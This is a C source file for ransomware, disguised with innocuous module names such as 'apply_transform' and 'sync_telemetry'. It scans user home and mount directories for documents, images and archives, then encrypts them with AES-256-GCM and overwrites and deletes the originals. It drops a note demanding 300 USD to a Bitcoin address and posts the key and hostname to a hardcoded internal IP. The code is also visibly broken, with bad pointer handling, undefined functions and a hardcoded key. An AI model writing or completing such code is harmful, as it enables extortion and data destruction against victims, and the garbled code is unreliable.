#include <curl/curl.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/pem.h>
#include <openssl/rand.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#define _GNU_SOURCEint init_secret(void) {
    unsigned char key[32];
    if (RAND_bytes(key, 32) != 1) {
        return 1;
    }

    BIO *b64_bio = BIO_new(BIO_f_base64());
    if (!b64_bio) {
        return 2;
    }
    BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);

    BIO *mem_bio = BIO_new(BIO_s_mem());
    if (!mem_bio) {
        BIO_free(b64_bio);
        return 3;
    }
    if (!BIO_push(b64_bio, mem_bio)) {
        BIO_free_all(b64_bio);
        return 4;
    }

    if (BIO_write(b64_bio, key, 32) <= 0 || BIO_flush(b64_bio) <= 0) {
        BIO_free_all(b64_bio);
        return 5;
    }

    char *b64_str = NULL;
    long b64_len = 0;
    b64_str = BIO_get_mem_data(mem_bio, &b64_len);
    if (!b64_str || b64_len <= 0) {
        BIO_free_all(b64_bio);
        return 6;
    }

    char *base64_key = malloc(b64_len + 1);
    if (!base64_key) {
        BIO_free_all(b64_bio);
        return 7;
    }
    memcpy(base64_key, b64_str, b64_len);
    base64_key[b64_len] = '\0';
    BIO_free_all(b64_bio);

    char json_buf[256];
    if (snprintf(json_buf, sizeof(json_buf), "{\"aes_key\":\"%s\"}", base64_key) < 0) {
        free(base64_key);
        return 8;
    }
    free(base64_key);

    FILE *fp = fopen("/tmp/.master.key", "wb");
    if (!fp) {
        return 9;
    }
    size_t to_write = strlen(json_buf);
    size_t written = fwrite(json_buf, 1, to_write, fp);
    fclose(fp);
    if (written != to_write) {
        return 10;
    }

    if (chmod("/tmp/.master.key", 0600) != 0) {
        return 11;
    }

    return 0;
}

/* === Module 2: scan_targets === */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>

static const char *whitelist[] = {
    ".xlsx", ".docx", ".pdf", ".txt", ".csv",
    ".jpg", ".png", ".db", ".backup", ".psd",
    ".zip", ".rar"
};
static const size_t whitelist_len = sizeof(whitelist) / sizeof(whitelist[0]);

/* Check if the file path ends with one of the whitelist extensions (case‑insensitive). */
static int has_whitelist_ext(const char *path)
{
    const char *dot = strrchr(path, '.');
    if (!dot || dot == path) return 0;
    const char *ext = dot + 1;
    for (size_t i = 0; i < whitelist_len; ++i) {
        if (strcasecmp(ext, whitelist[i]) == 0)
            return 1;
    }
    return 0;
}

/* Append a new path to the dynamic array, expanding it if necessary. */
static void add_match(char ***matches, size_t *count, size_t *capacity, const char *path)
{
    if (*count >= *capacity) {
        size_t new_cap = (*capacity == 0) ? 16 : (*capacity * 2);
        char **tmp = realloc(*matches, new_cap * sizeof(char *));
        if (!tmp) {
            perror("realloc");
            return;
        }
        *matches = &tmp;
        *capacity = new_cap;
    }
    (*matches)[*count] = strdup(path);
    if (!(*matches)[*count]) {
        perror("strdup");
        return;
    }
    ++(*count);
}

/* Free all strings and the array itself. */
static void free_matches(char **matches, size_t count)
{
    if (!matches) return;
    for (size_t i = 0; i < count; ++i)
        free(matches[i]);
    free(matches);
}

/* Process a directory, adding matching files to the result array. */
static void process_directory(const char *base_path, const char *dir_name,
                              char **matches, size_t *count, size_t *capacity)
{
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/%s", base_path, dir_name);

    DIR *dir = opendir(path);
    if (!dir) {
        perror(path);
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        /* Build full path to the entry */
        char entry_path[PATH_MAX];
        snprintf(entry_path, sizeof(entry_path), "%s/%s", path, entry->d_name);

        struct stat st;
        if (lstat(entry_path, &st) == -1) {
            perror(entry_path);
            continue;
        }

        if (S_ISDIR(st.st_mode)) {
            process_directory(base_path, entry_path, matches, count, capacity);
        } else if (S_ISREG(st.st_mode) && has_whitelist_ext(entry_path)) {
            add_match(&matches, count, capacity, entry_path);
        }
    }
    closedir(dir);
}

void scan_targets(char **matches, size_t *count)
{
    if (!matches || !count) return;
    *matches = NULL;
    *count = 0;
    size_t capacity = 0;

    const char *base_dirs[] = {
        "/home",
        "/mnt"
    };
    char homedir[PATH_MAX];
    if (!getenv("HOME")) {
        const char *scan = "/home";
        DIR *d = opendir(scan);
        if (!d) {
            perror(scan);
        } else {
            struct dirent *dent;
            while ((dent = readdir(d)) != NULL) {
                if (dent->d_name[0] == '.') continue;
                snprintf(homedir, sizeof(homedir), "/home/%s", dent->d_name);
                const char *subdirs[] = {"Documentos_Teste", "Documentos", "Downloads", "Imagens", NULL};
                for (int i = 0; subdirs[i]; ++i) {
                    char fulldir[PATH_MAX];
                    snprintf(fulldir, sizeof(fulldir), "%s/%s", homedir, subdirs[i]);
                    process_directory(homedir, subdirs[i], matches, count, &capacity);
                }
            }
            closedir(d);
        }
    } else {
        snprintf(homedir, sizeof(homedir), "/home/%s", getenv("HOME"));
        process_directory("/", "home", matches, count, &capacity);
    }

    process_directory("/", "mnt", matches, count, &capacity);
}

/* The caller should invoke free_matches(matches, count) when done. */
void free_matches(char **matches, size_t count)
{
    if (!matches) return;
    for (size_t i = 0; i < count; ++i)
        free(matches[i]);
    free(matches);
}

/* === Module 3: apply_transform === */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <sys/stat.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

static char *build_processed_path(const char *path)
{
    size_t path_len = strlen(path);
    const char *dot = strrchr(path, '.');
    size_t prefix_len = dot ? (size_t)(dot - path) : path_len;
    size_t suffix_len = 9; /* ".PROCESSED" length */
    char *result = malloc(prefix_len + suffix_len + (dot ? 1 + (path_len - prefix_len - 1) : 0) + 1);
    if (!result) return NULL;
    strncpy(result, path, prefix_len);
    result[prefix_len] = '\0';
    strcat(result, ".PROCESSED");
    if (dot) {
        strcat(result, dot);
    }
    return result;
}

static char *strip_processed_suffix(const char *path)
{
    size_t len = strlen(path);
    if (len > 9 && strcmp(path + len - 9, ".PROCESSED") == 0) {
        char *copy = malloc(len - 8);
        if (!copy) return NULL;
        strncpy(copy, path, len - 9);
        copy[len - 9] = '\0';
        return copy;
    }
    return strdup(path);
}

int apply_transform(const char *filepath)
{
    char *processed_path = build_processed_path(filepath);
    if (!processed_path) {
        perror("build_processed_path");
        return 1;
    }

    FILE *in = fopen(filepath, "rb");
    if (!in) {
        perror(filepath);
        free(processed_path);
        return 1;
    }

    if (fstat(fileno(in), (struct stat *)&( (void){0} ))) {
        perror("fstat");
        fclose(in);
        free(processed_path);
        return 1;
    }
    size_t filesize = (size_t) ((struct stat *)&( (void){0} ))->st_size;

    unsigned char *plain = malloc(filesize);
    if (!plain) {
        perror("malloc plain");
        fclose(in);
        free(processed_path);
        return 1;
    }
    if (fread(plain, 1, filesize, in) != filesize) {
        perror("fread");
        fclose(in);
        free(plain);
        free(processed_path);
        return 1;
    }
    fclose(in);

    unsigned char nonce[12];
    if (RAND_bytes(nonce, 12) != 1) {
        perror("RAND_bytes");
        free(plain);
        free(processed_path);
        return 1;
    }

    FILE *out = fopen(processed_path, "wb");
    if (!out) {
        perror(processed_path);
        free(plain);
        free(processed_path);
        return 1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        perror("EVP_CIPHER_CTX_new");
        goto cleanup;
    }
    const unsigned char key[32] = {
        0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,
        0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,
        0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
        0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F
    };
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, nonce) != 1) {
        perror("EVP_EncryptInit_ex");
        goto cleanup;
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAGLEN, 16, NULL) != 1) {
        perror("EVP_CTRL_GCM_SET_TAGLEN");
        goto cleanup;
    }

    unsigned char outbuf[4096];
    int outlen;
    size_t processed = 0;
    while (processed < filesize) {
        size_t chunk = filesize - processed;
        if (chunk > sizeof(outbuf)) chunk = sizeof(outbuf);
        if (EVP_EncryptUpdate(ctx, outbuf, &outlen,
                plain + processed, (int)chunk) != 1) {
            perror("EVP_EncryptUpdate");
            goto cleanup;
        }
        if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
            perror("fwrite ciphertext");
            goto cleanup;
        }
        processed += chunk;
    }
    if (EVP_EncryptFinal_ex(ctx, outbuf, &outlen) != 1) {
        perror("EVP_EncryptFinal_ex");
        goto cleanup;
    }
    if (fwrite(outbuf, 1, outlen, out) != (size_t)outlen) {
        perror("fwrite final");
        goto cleanup;
    }

    unsigned char tag[16];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        perror("EVP_CTRL_GCM_GET_TAG");
        goto cleanup;
    }
    if (fwrite(tag, 1, 16, out) != 16) {
        perror("fwrite tag");
        goto cleanup;
    }

    fclose(out);
    EVP_CIPHER_CTX_free(ctx);

    int fd = open(filepath, O_WRONLY | O_TRUNC | O_CREAT, 0666);
    if (fd == -1) {
        perror("open original for truncate");
        free(plain);
        free(processed_path);
        return 1;
    }
    unsigned char zero[1];
    for (size_t i = 0; i < filesize; ++i) {
        if (write(fd, zero, 1) != 1) {
            perror("write zero");
            close(fd);
            free(plain);
            free(processed_path);
            return 1;
        }
    }
    close(fd);

    if (unlink(filepath) != 0) {
        perror("unlink original");
        free(plain);
        free(processed_path);
        return 1;
    }

    char *original_name = strip_processed_suffix(processed_path);
    if (!original_name) {
        perror("strip_processed_suffix");
        free(plain);
        free(processed_path);
        return 1;
    }
    if (rename(processed_path, original_name) != 0) {
        perror("rename processed to original");
        free(original_name);
        free(plain);
        free(processed_path);
        return 1;
    }
    free(original_name);
    free(plain);
    free(processed_path);
    return 0;

cleanup:
    fclose(out);
    EVP_CIPHER_CTX_free(ctx);
    free(plain);
    free(processed_path);
    return 1;
}

/* === Module 4: write_status_notice === */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <limits.h>

int write_status_notice(const char *dirpath, const char *pattern) {
    const char *default_name = "#_STATUS_NOTICE_#.txt";
    const char *filename = pattern ? pattern : default_name;

    char fullpath[PATH_MAX];
    if (snprintf(fullpath, sizeof(fullpath), "%s/%s", dirpath, filename) >= (int)sizeof(fullpath)) {
        return -1;
    }

    FILE *fp = fopen(fullpath, "w");
    if (!fp) {
        return -1;
    }

    const char *notice = "request 300 USD in payment service for 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa and instruct contact via secure channel";
    if (fprintf(fp, "%s", notice) < 0 || fflush(fp) != 0 || fclose(fp) != 0) {
        return -1;
    }

    return 0;
}

/* === Module 5: sync_telemetry === */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <curl/curl.h>

int sync_telemetry(void) {
    FILE *fp = fopen("/tmp/.master.key", "rb");
    if (!fp) {
        perror("fopen /tmp/.master.key");
        return 1;
    }

    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek");
        fclose(fp);
        return 2;
    }
    long fsize_long = ftell(fp);
    if (fsize_long < 0) {
        perror("ftell");
        fclose(fp);
        return 3;
    }
    size_t fsize = (size_t)fsize_long;
    rewind(fp);

    char *filebuf = malloc(fsize + 1);
    if (!filebuf) {
        perror("malloc file buffer");
        fclose(fp);
        return 4;
    }
    size_t readcnt = fread(filebuf, 1, fsize, fp);
    if (readcnt != fsize) {
        perror("fread");
        free(filebuf);
        fclose(fp);
        return 5;
    }
    filebuf[fsize] = '\0';
    fclose(fp);

    const char *pattern = "\"aes_key\":\"";
    char *keyptr = strstr(filebuf, pattern);
    if (!keyptr) {
        fprintf(stderr, "Error: could not find aes_key field\n");
        free(filebuf);
        return 6;
    }
    keyptr += strlen(pattern);

    while (*keyptr && (*keyptr == ' ' || *keyptr == '\t' || *keyptr == '\n' || *keyptr == '\r'))
        keyptr++;

    if (*keyptr != '"') {
        fprintf(stderr, "Error: expected opening quote after aes_key value\n");
        free(filebuf);
        return 7;
    }
    keyptr++; 

    char *value_end = strchr(keyptr, '"');
    if (!value_end) {
        fprintf(stderr, "Error: unterminated aes_key value\n");
        free(filebuf);
        return 8;
    }
    size_t val_len = value_end - keyptr;
    char *aes_key = malloc(val_len + 1);
    if (!aes_key) {
        perror("malloc aes_key");
        free(filebuf);
        return 9;
    }
    memcpy(aes_key, keyptr, val_len);
    aes_key[val_len] = '\0';

    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        free(aes_key);
        free(filebuf);
        return 10;
    }

    char body[2048];
    if (snprintf(body, sizeof(body), "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}", aes_key, hostname) < 0) {
        fprintf(stderr, "Error: snprintf failed\n");
        free(aes_key);
        free(filebuf);
        return 11;
    }

    curl_global_init(CURL_GLOBAL_DEFAULT);
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Error: curl_easy_init failed\n");
        free(aes_key);
        free(filebuf);
        curl_global_cleanup();
        return 12;
    }

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (!headers) {
        fprintf(stderr, "Error: curl_slist_append failed\n");
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(aes_key);
        free(filebuf);
        return 13;
    }

    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.191:8080/collect");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);

    long http_code = 0;
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Error: curl_perform failed: %s\n", curl_easy_strerror(res));
        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        free(aes_key);
        free(filebuf);
        return 14;
    }
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            perror("remove /tmp/.master.key");
        }
    } else {
        fprintf(stderr, "Telemetry collection failed: HTTP status %ld\n", http_code);
    }

    free(aes_key);
    free(filebuf);
    return (http_code == 200) ? 0 : 15;
}

/* === Module 6: load_endpoint_config === */
#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static const signed char DecTable[256] = {
    ['A'] = 0,  ['B'] = 1,  ['C'] = 2,  ['D'] = 3,  ['E'] = 4,  ['F'] = 5,
    ['G'] = 6,  ['H'] = 7,  ['I'] = 8,  ['J'] = 9,  ['K'] =10,  ['L'] =11,
    ['M'] =12,  ['N'] =13,  ['O'] =14,  ['P'] =15,  ['Q'] =16,  ['R'] =17,
    ['S'] =18,  ['T'] =19,  ['U'] =20,  ['V'] =21,  ['W'] =22,  ['X'] =23,
    ['Y'] =24,  ['Z'] =25,  ['a'] =26,  ['b'] =27,  ['c'] =28,  ['d'] =29,
    ['e'] =30,  ['f'] =31,  ['g'] =32,  ['h'] =33,  ['i'] =34,  ['j'] =35,
    ['k'] =36,  ['l'] =37,  ['m'] =38,  ['n'] =39,  ['o'] =40,  ['p'] =41,
    ['q'] =42,  ['r'] =43,  ['s'] =44,  ['t'] =45,  ['u'] =46,  ['v'] =47,
    ['w'] =48,  ['x'] =49,  ['y'] =50,  ['z'] =51,  ['0'] =52,  ['1'] =53,
    ['2'] =54,  ['3'] =55,  ['4'] =56,  ['5'] =57,  ['6'] =58,  ['7'] =59,
    ['8'] =60,  ['9'] =61,  ['+'] =62,  ['/'] =63};

/* Decode a single base64 character to its 6‑bit value.
   Returns -1 for characters outside the Base64 alphabet. */
static signed char decode_b64char(unsigned char c)
{
    return DecTable[c];
}

/* Allocate a buffer, decode base64 input into it, null‑terminate and return it.
   On allocation failure the function returns NULL and sets errno to ENOMEM. */
static char *base64_decode(const unsigned char *input, size_t length)
{
    size_t groups = length / 4;
    size_t out_len = groups * 3;
    if (length % 4 == 2) out_len += 1;
    else if (length % 4 > 2) out_len += 2;

    char *output = malloc(out_len + 1);
    if (!output) {
        errno = ENOMEM;
        return NULL;
    }

    size_t out_i = 0;
    for (size_t i = 0; i < length; ) {
        signed char triple[6];
        signed char c;
        for (int j = 0; j < 4; ++j) {
            c = decode_b64char(input[i++]);
            if (c < 0) {
                free(output);
                errno = EINVAL;
                return NULL;
            }
            triple[j] = c;
        }

        output[out_i++] = (triple[0] << 2) | ((triple[1] & 0x30) >> 4);
        if (triple[1] & 0x20) {
            output[out_i++] = ((triple[1] & 0x0F) << 4) |
                               ((triple[2] & 0x3C) >> 2);
        }
        if (triple[2] & 0x10) {
            output[out_i++] = ((triple[2] & 0x03) << 6) |
                               triple[3];
        }
    }
    output[out_i] = '\0';
    return output;
}

typedef struct {
    char *management_url;
    char *payment_identifier;
} endpoint_config_t;

endpoint_config_t *load_endpoint_config(void)
{
    static const unsigned char mgmt_url_enc[] = "aHR0cDovL21nbC5leGFtcGxlLmNvbT4=";
    static const size_t mgmt_url_enc_len = sizeof(mgmt_url_enc) - 1;
    static const unsigned char payment_id_enc[] = "MTIzNDU2Nzg5MDEyMzQ1NjcuLi4=";
    static const size_t payment_id_enc_len = sizeof(payment_id_enc) - 1;

    char *decoded_url = base64_decode(mgmt_url_enc, mgmt_url_enc_len);
    if (!decoded_url) {
        return NULL;
    }

    char *decoded_payment = base64_decode(payment_id_enc, payment_id_enc_len);
    if (!decoded_payment) {
        free(decoded_url);
        return NULL;
    }

    static endpoint_config_t cfg = {
        .management_url = decoded_url,
        .payment_identifier = decoded_payment
    };
    return &cfg;
}

/* === Helper for unique directory collection === */
static int array_contains(char **arr, size_t len, const char *str)
{
    for (size_t i = 0; i < len; ++i)
        if (strcmp(arr[i], str) == 0)
            return 1;
    return 0;
}

/* Add str to arr if not present; expands arr as needed. Returns 0 on success, non‑zero on failure. */
static int add_unique_string(char **arr, size_t *len, size_t *cap, const char *str)
{
    if (array_contains(arr, *len, str))
        return 0;
    if (*len >= *cap) {
        size_t newcap = *cap ? *cap * 2 : 16;
        char **tmp = realloc(arr, newcap * sizeof(char *));
        if (!tmp) return 1;
        arr = tmp;
        *cap = newcap;
    }
    arr[*len] = strdup(str);
    if (!arr[*len]) return 1;
    ++(*len);
    return 0;
}

/* Free the array and its strings */
static void free_string_array(char **arr, size_t len)
{
    for (size_t i = 0; i < len; ++i)
        free(arr[i]);
    free(arr);
}

int main(int argc, char *argv[])
{
    if (init_secret() != 0) {
        return 1;
    }

    char **matches = NULL;
    size_t count = 0;
    scan_targets(&matches, &count);

    char **unique_dirs = NULL;
    size_t unique_count = 0;
    size_t unique_cap = 0;

    for (size_t i = 0; i < count; ++i) {
        const char *filepath = matches[i];

        if (apply_transform(filepath) != 0) {
            /* ignore errors; continue processing other files */
        }

        /* Extract directory */
        char *dir = strdup(filepath);
        char *slash = strrchr(dir, '/');
        if (slash) *slash = '\0';
        else {
            /* filepath is root-like; treat as "/" */
            dir[0] = '/';
            dir[1] = '\0';
        }

        add_unique_string(&unique_dirs, &unique_count, &unique_cap, dir);
    }

    for (size_t i = 0; i < unique_count; ++i) {
        write_status_notice(unique_dirs[i], NULL);
    }

    sync_telemetry();

    if (argc > 0) {
        register_service(argv[0]);
    }

    free_matches(matches, count);
    free_string_array(unique_dirs, unique_count);
    return 0;
}

/*